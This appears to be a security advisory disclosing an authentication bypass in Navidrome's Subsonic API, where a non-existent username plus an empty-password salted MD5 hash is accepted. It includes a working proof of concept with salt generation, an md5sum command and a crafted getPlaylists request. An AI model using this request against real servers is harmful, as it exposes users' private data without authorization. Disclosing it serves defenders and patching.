summary: |
  Navidrome allows an authentication bypass in Subsonic API with non-existent username
  ### Summary

  In certain Subsonic API endpoints, authentication can be bypassed by using a non-existent username combined with an empty (salted) password hash. This allows read-only access to the server’s resources, though attempts at write operations fail with a “permission denied” error.

  ### Details

  A flaw in the authentication check process allows an attacker to specify any arbitrary username that does not exist on the system, along with a salted hash of an empty password. Under these conditions, Navidrome treats the request as authenticated, granting access to various Subsonic endpoints without requiring valid credentials.

  ### Proof of Concept (PoC)

  1. Generate a random salt:

     ```javascript
     // e.g., salt = "x1vbudn1m6d"
     Math.random().toString(36).substring(2, 15)
     ```

  2. Calculate the MD5 hash of an empty password plus the salt:

     ```shell
     # Using the example salt above
     echo -n "x1vbudn1m6d" | md5sum
     81f0c0fb5d202ab0d012e6eaeb722d79  -
     ```

  3. Send a request specifying a fake user, with the hash and salt values:

     ```
     GET https://[host]/rest/getPlaylists?u=FakeUser&t=81f0c0fb5d202ab0d012e6eaeb722d79&s=x1vbudn1m6d&v=1.16.1&c=castafiore&f=json
     ```

  ### Impact

  An attacker can use any non-existent username to bypass the authentication system and gain access to various read-only data in Navidrome, such as user playlists. However, any attempt to modify data fails due to insufficient permissions, limiting the impact to unauthorized viewing of information.
